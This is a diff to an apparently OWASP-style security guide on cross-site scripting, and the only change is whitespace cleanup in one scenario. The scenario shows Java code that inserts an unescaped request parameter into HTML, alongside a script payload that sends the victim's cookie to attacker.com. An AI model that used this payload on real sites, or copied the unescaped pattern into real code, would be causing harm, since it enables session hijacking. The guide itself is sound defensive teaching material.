@@ -28,10 +28,10 @@ Preventing XSS requires separation of untrusted data from active browser content
 
 **Scenario 1**: The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:
 
-`(String) page += "<input name='creditcard' type='TEXT'  value='" + request.getParameter("CC") + "'>";`
+`(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
 The attacker modifies the ‘CC’ parameter in the browser to:
 
-`'><script>document.location=  'http://www.attacker.com/cgi-bin/cookie.cgi?  foo='+document.cookie</script>'`
+`'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`
 
 This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.
 
